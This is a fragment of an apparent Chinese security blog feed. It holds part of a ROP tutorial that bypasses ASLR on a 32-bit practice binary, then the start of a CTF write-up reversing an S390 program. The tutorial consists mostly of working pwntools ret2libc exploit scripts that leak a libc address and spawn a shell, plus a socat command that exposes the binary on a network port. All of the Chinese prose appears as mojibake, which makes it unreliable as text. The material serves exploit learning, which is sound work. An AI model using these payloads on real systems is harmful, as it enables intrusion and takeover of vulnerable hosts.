href="#ç»•è¿‡ASLRé˜²æŠ¤" class="headerlink" title="ç»•è¿‡ASLRé˜²æŠ¤"></a>ç»•è¿‡ASLRé˜²æŠ¤</h2><p>æŠŠASLRæ‰“å¼€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>å†æ¥çœ‹çœ‹libcçš„åœ°å€ï¼Œåˆ©ç”¨lddå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd level2</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051624220.png" alt="image-20210805162458153"></p><p>éƒ½ä¸ä¸€æ ·ï¼ŒåŸæ¥çš„expå°±ç”¨ä¸äº†äº†</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å…ˆæ³„éœ²libc.soä¸­çš„å…¶ä»–å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œåœ¨è®¡ç®—é‚£ä¸ªå…¶ä»–å‡½æ•°åˆ°systemå‡½æ•°å’Œâ€/bin/shâ€ä¹‹é—´çš„è·ç¦»è¿›è€Œæ±‚å‡ºsystemå‡½æ•°å’Œâ€/bin/shâ€çœŸæ­£çš„åœ°å€ï¼Œä¹‹åå†æ‰§è¡Œæˆ‘ä»¬çš„ret2libcçš„shellcodeã€‚</p><p>å…ˆæŠŠlibcæ–‡ä»¶copyè¿‡æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /lib32/libc.so.6 libc.so</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹å¯ä»¥åˆ©ç”¨çš„å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objdump -d -j .plt level2</span><br><span class="line">objdump -R level2</span><br><span class="line">objdump -d level2</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051715164.png" alt="image-20210805171525093"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051716180.png" alt="image-20210805171619133"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051923936.png" alt="image-20210805192330867"></p><p>å¾—åˆ°vulnerable_functionçš„åœ°å€ä¸º0x804843b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x804843b</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10003,fork EXEC:./level #å¯ä»¥å¼€ç«¯å£è®©remoteè¿ç»“</span><br></pre></td></tr></table></figure><p>p32ã€p64æ˜¯æ‰“åŒ…ä¸ºäºŒè¿›åˆ¶ï¼Œu32ã€u64æ˜¯è§£åŒ…ä¸ºäºŒè¿›åˆ¶</p><p>recv(numb=4096, timeout=default) : ç»™å‡ºæ¥æ”¶å­—èŠ‚æ•°,timeoutæŒ‡å®šè¶…æ—¶</p><p>next(libc.search(â€˜/bin/shâ€™))è¿”å›â€™/bin/shâ€™å­—ç¬¦ä¸²çš„ä½ç½®</p><p><strong>ç»“æœä¸å¯¹ï¼Œæ²¡æ‹¿åˆ°shell</strong></p><p>è¿è¡Œæ—¶åŠ å…¥æ³¨é‡Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;symbols[&#x27;write&#x27;] = &quot;</span> + <span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;plt_write= &#x27;</span> + <span class="built_in">hex</span>(plt_write)</span><br><span class="line"></span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;got_write= &#x27;</span> + <span class="built_in">hex</span>(got_write)</span><br><span class="line"></span><br><span class="line">vulfun_addr = <span class="number">0x804843b</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;write_addr= &#x27;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc.symbols[&#x27;</span>write<span class="string">&#x27;] = &#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;system&#x27;]= &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;next(libc.search(&#x27;/bin/sh&#x27;))= &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;write&#x27;] - libc.symbols[&#x27;system&#x27;] = &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;(libc.symbols[&#x27;write&#x27;] - next(libc.search(&#x27;/bin/sh&#x27;)))= &quot;</span> + <span class="built_in">hex</span>((libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr= &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr= &#x27;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061105390.png" alt="image-20210806110516325"></p><p>gdbè°ƒè¯•æŠ¥é”™åç”Ÿæˆçš„coreæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb level2 core</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061103008.png" alt="image-20210806110348928"></p><p>æˆ‘çš„writeæº¢å‡ºçš„æ²¡é”™</p><p>æœ¬åœ°çœ‹çœ‹libcé‡Œçš„å‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061107273.png" alt="image-20210806110706208"></p><p>ç¡®å®æ²¡é”™å•Š</p><p>æœ¬åœ°æ–­ä¸ªç‚¹è®¡ç®—ä¸€ä¸‹</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061108269.png" alt="image-20210806110830206"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061110269.png" alt="image-20210806111045205"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061111361.png" alt="image-20210806111141314"></p><p>å’Œæˆ‘å†™ä»£ç çš„ç®—å‡ºæ¥ä¸ä¸€æ ·å•Š</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061112158.png" alt="image-20210806111233107"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061113443.png" alt="image-20210806111307393"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x9aee0 - 0x99b80)</span><br><span class="line">&#x27;0x1360&#x27;</span><br><span class="line">&gt;&gt;&gt; hex(0x85e9b - 0x84c5b)</span><br><span class="line">&#x27;0x1240&#x27;</span><br></pre></td></tr></table></figure><p>æƒ³ä¸æ˜ç™½å•Šå‘œå‘œå‘œ</p><p>ç”¨æ‰‹ç®—çš„0x9aee0å’Œ0x85e9bå†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">w_sys = <span class="number">0x9aee0</span></span><br><span class="line">w_bin = <span class="number">0x85e9b</span></span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;plt_write= &#x27;</span> + <span class="built_in">hex</span>(plt_write)</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;got_write= &#x27;</span> + <span class="built_in">hex</span>(got_write)</span><br><span class="line">vulfun_addr = <span class="number">0x804843b</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;write_addr=&#x27;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;system&#x27;]=&quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;next(libc.search(&#x27;/bin/sh&#x27;))&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;write&#x27;] - libc.symbols[&#x27;system&#x27;] = &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;(libc.symbols[&#x27;write&#x27;] - next(libc.search(&#x27;/bin/sh&#x27;)))&quot;</span> + <span class="built_in">hex</span>((libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - w_sys</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr= &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line">binsh_addr = write_addr + w_bin</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr= &#x27;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061142976.png" alt="image-20210806114259908"></p><p>æˆåŠŸæ‹¿åˆ°shellï¼Œè¿™ä¸ªé—®é¢˜ä»¥åå›æ¥è§£å†³ï¼ˆå’•å’•å’•ğŸ•Šï¼‰</p><p>å†kaliä¸­systemåœ°å€å¯¹äº†ï¼Œå­—ç¬¦ä¸²â€/bin/shâ€éƒ¨åˆ†é”™äº†é€šè¿‡åŠ¨è°ƒå‘ç°å°‘äº†0x40 ç»™è¡¥ä¸Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;symbols[&#x27;write&#x27;] = &quot;</span> + <span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;plt_write= &#x27;</span> + <span class="built_in">hex</span>(plt_write)</span><br><span class="line"></span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;got_write= &#x27;</span> + <span class="built_in">hex</span>(got_write)</span><br><span class="line"></span><br><span class="line">vulfun_addr = <span class="number">0x804843b</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;write_addr= &#x27;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;write&#x27;] = &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;system&#x27;]= &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;next(libc.search(&#x27;/bin/sh&#x27;))= &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;write&#x27;] - libc.symbols[&#x27;system&#x27;] = &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;(libc.symbols[&#x27;write&#x27;] - next(libc.search(&#x27;/bin/sh&#x27;)))= &quot;</span> + <span class="built_in">hex</span>((libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr= &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))) - <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr= &#x27;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯å› ä¸ºç¯å¢ƒå½±å“ï¼Œå°šä¸”æœªæ‰¾åˆ°è§£å†³æ–¹æ³•</p><h3 id="å‡å¦‚æ²¡æœ‰libc-soæ€ä¹ˆåŠ"><a href="#å‡å¦‚æ²¡æœ‰libc-soæ€ä¹ˆåŠ" class="headerlink" title="å‡å¦‚æ²¡æœ‰libc.soæ€ä¹ˆåŠ"></a>å‡å¦‚æ²¡æœ‰libc.soæ€ä¹ˆåŠ</h3><p>åˆ©ç”¨LibcSearcher</p><p>å¯ä»¥åˆ©ç”¨å®ƒæ‰¾å‡ºåç§»</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux-x86å­¦ä¹ &quot;&gt;&lt;a href=&quot;#ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux-x86å­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x86å­¦ä¹ &quot;&gt;&lt;/a&gt;ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x86å­¦ä¹ &lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>2020 æ¹–æ¹˜æ¯ easyZ æ¡†æ¶(S390)</title>
    <link href="http://example.com/2021/08/13/%E6%B9%96%E6%B9%98%E6%9D%AFS390/"/>
    <id>http://example.com/2021/08/13/%E6%B9%96%E6%B9%98%E6%9D%AFS390/</id>
    <published>2021-08-13T11:39:43.683Z</published>
    <updated>2021-08-13T07:47:35.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="easyZ"><a href="#easyZ" class="headerlink" title="easyZ"></a>easyZ</h1><p>ä¸€ç‚¹éƒ½ä¸ç®€å•å¥½å—ï¼Œæ¡†æ¶(S390)éƒ½çœ‹ä¸å‡ºæ¥ğŸ¤ª</p><p>å…ˆç”¨idaæ‰“å¼€å‘ç°ä¸èƒ½åæ±‡ç¼–</p><p>ç”¨linuxçš„objdumpçœ‹çœ‹æ¡†æ¶</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150240.png" alt="image-20201117195652477"></p><p>å¥½åƒæ²¡æœ‰S390</p><p>åœ¨kaliä¸­è£…ä¸Šqemuæ¥æ¨¡æ‹Ÿç¨‹åºè¿è¡Œå‘ç°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150317.png" alt="image-20201117175913716"></p><p>å‘ç°å¯ä»¥æœç´¢çš„å…³é”®å­—ç¬¦ä¸²</p><p>åœ¨hex.txtä¸­æŸ¥æ‰¾åˆ°ç›¸åº”å­—ç¬¦ä¸²åŠå®ƒçš„åœ°å€</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150331.png" alt="image-20201117180221169"></p><p>å»dis.txtä¸­æœç´¢æœ‰é‚£äº›æœ‰ç”¨åˆ°1071060å·¦å³åœ°å€çš„è¡Œï¼Œæ‰¾åˆ°å‡½æ•°ä¸»ä½“</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150338.png" alt="image-20201117202007252"></p><p>å¼€å§‹åˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1000b38:eb bf f0 58 00 24 stmg%r11,%r15,88(%r15)//ä¸»å‡½æ•°</span><br><span class="line">1000b3e:e3 f0 ff 20 ff 71 lay%r15,-224(%r15)</span><br><span class="line">1000b44:b9 04 00 bf       lgr%r11,%r15</span><br><span class="line">1000b48:b2 4f 00 10       ear%r1,%a0</span><br><span class="line">1000b4c:eb 11 00 20 00 0d sllg%r1,%r1,32</span><br><span class="line">1000b52:b2 4f 00 11       ear%r1,%a1</span><br><span class="line">1000b56:d2 07 b0 d8 10 28 mvc216(8,%r11),40(%r1)</span><br><span class="line">1000b5c:c0 20 00 03 82 84 larl%r2,0x1071064  //Please input your string:</span><br><span class="line">1000b62:c0 e5 00 00 40 43 brasl%r14,0x1008be8 //åŠ è½½å‡½æ•°åœ°å€0x1008be8 (printf)</span><br><span class="line">1000b68:ec 1b 00 a6 00 d9 aghik%r1,%r11,166</span><br><span class="line">1000b6e:b9 04 00 31       lgr%r3,%r1</span><br><span class="line">1000b72:c0 20 00 03 82 87 larl%r2,0x1071080  //å‡†å¤‡è¯»å–è¾“å…¥å­—ç¬¦ä¸²</span><br><span class="line">1000b78:c0 e5 00 00 3a 5c brasl%r14,0x1008030 //è°ƒç”¨è¾“å…¥å‡½æ•°(scanf)</span><br><span class="line">1000b7e:ec 1b 00 a6 00 d9 aghik%r1,%r11,166</span><br><span class="line">1000b84:b9 04 00 21       lgr%r2,%r1          //store r2,r1  å°†r2å­˜åˆ°åé¢çš„r1é‡Œ</span><br><span class="line">1000b88:c0 e5 ff ff fe c4 brasl%r14,0x1000910 //åŠ è½½å‡½æ•°åœ°å€0x1000910ï¼ˆå‡½æ•°1ï¼‰</span><br><span class="line">1000b8e:b9 04 00 12       lgr%r1,%r2</span><br><span class="line">1000b92:12 11             ltr%r1,%r1</span><br><span class="line">1000b94:a7 84 00 17       je0x1000bc2</span><br><span class="line">1000b98:ec 1b 00 a6 00 d9 aghik%r1,%r11,166</span><br><span class="line">1000b9e:b9 04 00 21       lgr%r2,%r1</span><br><span class="line">1000ba2:c0 e5 ff ff ff 33 brasl%r14,0x1000a08 //åŠ è½½å‡½æ•°åœ°å€0x1000a08ï¼ˆå‡½æ•°2ï¼‰</span><br><span class="line">1000ba8:b9 04 00 12       lgr%r1,%r2</span><br><span class="line">1000bac:12 11             ltr%r1,%r1</span><br><span class="line">1000bae:a7 84 00 0a       je0x1000bc2</span><br><span class="line">1000bb2:c0 20 00 03 82 69 larl%r2,0x1071084 //you win</span><br><span class="line">1000bb8:c0 e5 00 00 40 18 brasl%r14,0x1008be8//åŠ è½½å‡½æ•°åœ°å€0x1008be8 (printf)</span><br><span class="line">1000bbe:a7 f4 00 08       j0x1000bce</span><br><span class="line">1000bc2:c0 20 00 03 82 66 larl%r2,0x107108e //you lose</span><br><span class="line">1000bc8:c0 e5 00 00 40 10 brasl%r14,0x1008be8//åŠ è½½å‡½æ•°åœ°å€0x1008be8 (printf)</span><br><span class="line">1000bce:a7 18 00 00       lhi%r1,0</span><br><span class="line">1000bd2:b9 14 00 11       lgfr%r1,%r1</span><br><span class="line">1000bd6:b9 04 00 21       lgr%r2,%r1</span><br><span class="line">1000bda:b2 4f 00 10       ear%r1,%a0</span><br><span class="line">1000bde:eb 11 00 20 00 0d sllg%r1,%r1,32</span><br><span class="line">1000be4:b2 4f 00 11       ear%r1,%a1</span><br><span class="line">1000be8:d5 07 b0 d8 10 28 clc216(8,%r11),40(%r1)</span><br><span class="line">1000bee:a7 84 00 05       je0x1000bf8</span><br><span class="line">1000bf2:c0 e5 00 00 e5 2b brasl%r14,0x101d648</span><br><span class="line">1000bf8:e3 40 b1 50 00 04 lg%r4,336(%r11)</span><br><span class="line">1000bfe:eb bf b1 38 00 04 lmg%r11,%r15,312(%r11)</span><br><span class="line">1000c04:07 f4             br%r4 </span><br><span class="line">1000c06:07 07             nopr%r7   //æ— 